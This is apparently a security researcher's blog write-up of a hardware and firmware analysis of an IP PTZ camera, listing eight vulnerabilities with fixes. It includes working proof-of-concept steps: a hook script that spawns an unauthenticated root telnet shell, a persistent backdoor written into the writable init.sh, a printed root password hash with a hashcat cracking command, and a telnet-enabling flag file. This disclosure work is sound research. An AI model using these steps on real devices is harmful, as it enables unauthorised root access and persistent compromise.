---
title: "IP Camera A-CW2303C-M — Hardware & Firmware Analysis"
date: 2026-02-12
tags: ["hardware", "firmware", "IoT", "reverse-engineering", "embedded"]
summary: "Full hardware-level engagement on an IP PTZ camera: SPI flash dump, filesystem extraction, and manual static analysis revealing 8 vulnerabilities — including two critical RCE."
---

> **Status: Work in Progress** — UART analysis in progress. This page will be updated as the engagement advances.

---

## Target

| Field | Value |
|-------|-------|
| Device | IP Camera A-CW2303C-M (PTZ, Wi-Fi, BLE) |
| Firmware | A\_CW2303C\_F\_1.0.0.030 |
| SoC | XCv30 |
| Image Sensor | cv2003 |
| MAC Address | 68:EE:4B:4A:68:59 (Sharetronic Data Technology) |

---

## Methodology

The analysis followed a hardware-first approach: physical disassembly, SPI flash extraction, filesystem analysis, and manual static review of boot scripts and binaries.

### 1. Disassembly & Chip Identification

The device was disassembled to expose the PCB. The SPI NOR Flash chip was identified and accessed via SOP8 clip.

### 2. Firmware Dump

| Item | Detail |
|------|--------|
| Programmer | CH341A |
| Connection | SOP8 clip / direct pin contact |
| Tool | `flashrom` |
| Output | Raw binary image |

```bash
flashrom -p ch341a_spi -r firmware.bin
```

The raw binary was verified with `md5sum` before and after extraction to confirm read integrity.

### 3. Filesystem Extraction

```bash
binwalk -Me firmware.bin
```

`binwalk` identified and extracted:
- **RootFS** — main read-only filesystem
- **JFFS2** data partition — writable, persistent across reboots

### 4. Static Analysis

Manual inspection was performed on:
- Boot scripts (`init.sh`, `init.app.sh`)
- Networking scripts (`wifi.ap.sh`, `wifi.configure.sh`)
- Update logic (`upgrade.check.sh`, `upgrade.sh`)
- Credential storage (`/etc/shadow`, data partition config files)

> **Note on tooling:** Automated binary analysis with Ghidra (or MCP-assisted Claude integration) was intentionally avoided — the goal of this engagement was hands-on manual practice and a deeper understanding of the firmware internals.

---

## Findings Summary

| ID | Title | Severity | Status |
|----|-------|----------|--------|
| VULN-01 | Arbitrary Code Execution via SD Card (HOOK\_PD.sh) | **Critical** | Verified on device |
| VULN-02 | WiFi Credentials Stored in Base64 | High | Verified on device |
| VULN-03 | Root Password Hash MD5-crypt | High | Verified (hash extracted) |
| VULN-04 | Persistent Backdoor via Writable Data Partition | **Critical** | Verified via code analysis |
| VULN-05 | Debug Telnet Backdoor via SD Card Flag | High | Verified on device |
| VULN-06 | Multiple Unsigned Script Execution Entry Points | High | Verified via firmware analysis |
| VULN-07 | OTA Firmware Integrity Check MD5-only | High | **Pending confirmation** |
| VULN-08 | Open WiFi Access Point (No WPA) | High | **Pending confirmation** |

---

## VULN-01 — Arbitrary Code Execution via SD Card

**Severity: Critical**

During boot, `init.app.sh` checks for a script at a predictable SD card path and executes it as root — no signature verification, no checksum, no authentication.

**Vulnerable code (`init.app.sh`, lines 624–637):**

```sh
if [ -e /mnt/sdcard/XC_${PRJ_NAME}_HOOK/HOOK_PD.sh ] || \
   [ -e /mnt/sdcard/XC_TEST_HOOK/HOOK_PD.sh ]; then
    chmod +x /mnt/sdcard/XC_${PRJ_NAME}_HOOK/HOOK_PD.sh
    sh /mnt/sdcard/XC_${PRJ_NAME}_HOOK/HOOK_PD.sh
    USR_HOOK=$?
fi
```

**PoC:**

1. Created directory `XC_A_CW2303C_F_HOOK/` on a FAT32 SD card
2. Placed `HOOK_PD.sh`:

```sh
#!/bin/sh
telnetd -l /bin/sh &
exit 1
```

3. Inserted card, powered device — after ~60 seconds, an unauthenticated root shell was available on TCP/23.

**Impact:** An attacker with brief physical access (or SD card access) gains full root control. Saved credentials can be extracted and persistent backdoors can be installed.

**Remediation:** Disable SD hook logic in production builds. Implement digital signature verification before executing any external script.

---

## VULN-02 — WiFi Credentials Stored in Base64

**Severity: High**

SSID and password are stored in the data partition encoded in Base64. Base64 is encoding, not encryption — fully reversible.

**Vulnerable code (`wifi.configure.sh`):**

```sh
ENC_TOOL=/uinit/bin/Base64Encoder
DEC_TOOL=/uinit/bin/Base64Decoder

${ENC_TOOL} if=${ARG_SSID} of=${TMP_FILE}
${ENC_TOOL} if=${ARG_PASS} of=${TMP_FILE}

${DEC_TOOL} if=${TMP_FILE} of=${ARG_SSID}
${DEC_TOOL} if=${TMP_FILE} of=${ARG_PASS}
```

**PoC:** Root shell obtained via VULN-01. Located config files in the JFFS2 data partition. Decoded with `base64 -d` — plaintext SSID and password recovered.

**Impact:** Any attacker with filesystem access (flash dump or SD hook) can recover the WiFi password, enabling further network compromise.

**Remediation:** Use strong symmetric encryption (e.g., AES) with keys stored in a hardware-backed keystore. Remove all use of Base64 for sensitive secrets.

---

## VULN-03 — Root Password Hash MD5-crypt

**Severity: High**

The root account uses MD5-crypt (`$1$`), an obsolete algorithm trivially crackable with modern GPU hardware.

**Evidence (`/etc/shadow`):**

```
root:$1$Ckg8QL93$E3C0tyr0HT5pPbyh.sNMD/:1:0:99999:7:::
```

The hash is directly extractable from the firmware dump.

**Attack path:** `hashcat -m 500 hash.txt wordlist.txt`

**Impact:** Cracked password grants full access via Telnet (see VULN-05).

**Remediation:** Replace MD5-crypt with a memory-hard algorithm (Argon2, bcrypt). Enforce strong unique default credentials.

---

## VULN-04 — Persistent Backdoor via Writable Data Partition

**Severity: Critical**

`init.sh` executes a script from `/etc/conf.d/` — a path on the writable JFFS2 partition — at boot. An attacker can write a malicious script once, and it persists across SD card removal and standard factory resets (JFFS2 is often preserved).

**Vulnerable code (`init.sh`, lines 336–346):**

```sh
if [ -e /etc/conf.d/init.sh ]; then
    echo "[uinit::init] hook enter ..."
    chmod 777 /etc/conf.d/init.sh
    sh /etc/conf.d/init.sh
    RET_HOOK=$?
    if [ "${RET_HOOK}" != "0" ]; then
        rm -rf /etc/conf.d/init.sh
    fi
fi
```

**PoC (from root shell obtained via VULN-01):**

```sh
echo '#!/bin/sh' > /etc/conf.d/init.sh
echo 'telnetd -l /bin/sh &' >> /etc/conf.d/init.sh
```

**Impact:** Persistent root backdoor that survives SD card removal and factory resets.

**Remediation:** Never execute scripts from writable partitions during boot. Enforce signed script policy.

---

## VULN-05 — Debug Telnet Backdoor via SD Card Flag

**Severity: High**

A zero-byte flag file on the SD card triggers `telnetd` to start at boot — no code required.

**Vulnerable code (`init.app.sh`):**

```sh
if [ -e /product/wired ] || [ -e /product/wifi ]; then
    if [ "${USR_WIFI}" != "N" ] || [ "${USR_ETH0}" != "N" ]; then
        if [ -e /mnt/sdcard/XC_${PRJ_NAME}_HOOK/TELNET.ENABLE ]; then
            telnetd &
        fi
    fi
fi
```

**PoC:** Created empty file `XC_A_CW2303C_F_HOOK/TELNET.ENABLE` on FAT32 SD. Rebooted — port 23 open, login via `/etc/shadow`.

![TELNET.ENABLE check in init.app.sh](/images/projects/code1.png)

![Root shell via Telnet — PoC confirmed](/images/projects/code2.png)

**Impact:** Lowers the attack bar for network access — any SD card is sufficient to open Telnet.

**Remediation:** Remove all debug flag logic from production firmware.

---

## VULN-06 — Multiple Unsigned Script Execution Entry Points

**Severity: High**

The firmware has three separate SD card script execution hooks, none with signature verification:

| Hook file | Triggered from | Boot phase | Effect |
|-----------|---------------|------------|--------|
| `factory.sh` | `init.sh` | Early boot (pre-mount) | Executes + `exit 0` (halts normal boot) |
| `HOOK.sh` | `init.sh` | Pre-application | Executes as root |
| `HOOK_PD.sh` | `init.app.sh` | Post-driver (network ready) | Executes as root |

Additionally, the main application binary can be replaced from the SD card:

```sh
if [ -e /mnt/sdcard/XC_${PRJ_NAME}_HOOK/XC.Media ]; then
    cp -rf /mnt/sdcard/XC_${PRJ_NAME}_HOOK/XC.Media /tmp/XC.Media
    chmod 777 /tmp/XC.Media
fi
```

And the firmware itself can be flashed from SD with no signature check:

```sh
if [ -e /mnt/sdcard/XC_${SYS_NAME}_HOOK/firmware.bin ]; then
    sh /uinit/script/upgrade.sh file=/mnt/sdcard/XC_${SYS_NAME}_HOOK/firmware.bin
fi
```

**Remediation:** Strip all hook and flag-based logic from production builds. Enforce signed firmware.

---

> **Note:** VULN-07 and VULN-08 are identified through static firmware analysis but have not yet been confirmed with live testing. Validation is pending. Unfortunately, the day ran out before we could finish — turns out 24 hours isn't enough time when you're also trying to break firmware. We've filed a complaint with the space-time continuum; no response yet.

## VULN-07 — OTA Firmware Integrity Check MD5-only

**Severity: High**

OTA firmware integrity is verified using MD5 only — a cryptographically broken algorithm. The reference hash is embedded inside the firmware package itself, meaning the attacker controls both the payload and the hash.

**Vulnerable code (`upgrade.check.sh`):**

```sh
PKG_MD5S=`${PKG_TOOL} file=${OTA_FILE} key=md5`
OTA_MD5S=`md5sum ${PKG_PURE} | cut -d' ' -f1`
if [ "${OTA_MD5S}" != "${PKG_MD5S}" ]; then
    exit 17
fi
```

**Impact:** An attacker can craft a malicious firmware image, compute its MD5, embed it in the package, and push it as a legitimate OTA update.

**Remediation:** Use cryptographic signing (e.g., RSA/ECDSA) with a trusted public key burned into ROM. Verify signatures server-side before distribution.

---

## VULN-08 — Open WiFi Access Point (No WPA)

**Severity: High**

In AP mode (initial setup), the camera creates an open WiFi access point with no WPA/WPA2 authentication.

**Vulnerable code (`wifi.ap.sh`):**

```sh
echo "ssid=Alaga-AP${LICENSE:12:4}" >> ${CFG_HOST}
echo "auth_algs=1" >> ${CFG_HOST}
# No wpa=, wpa_passphrase=, or wpa_key_mgmt= directives
```

The SSID format `Alaga-AP<4 digits>` is predictable and easily identifiable.

**Impact:** Any nearby user can connect to the AP during setup, perform MITM attacks on the initial configuration exchange, and potentially intercept credentials being sent to the device.

**Remediation:** Enforce WPA2-PSK on the setup AP with a randomly generated per-device password (e.g., derived from serial number or printed on the label).

---

## Next Steps

- [ ] UART analysis — identify UART pins, capture boot log, attempt console access
- [ ] Binary reversing — manual Ghidra analysis of `XC.Media` main application binary
- [ ] Network traffic analysis — capture and inspect app-to-cloud protocol
- [ ] BLE attack surface — enumerate GATT services, test for unauthenticated commands

---

> **Disclaimer:** This analysis was performed on a personally owned device in a controlled lab environment for educational and research purposes only. All findings are disclosed responsibly. Unauthorized access to systems you do not own is illegal.
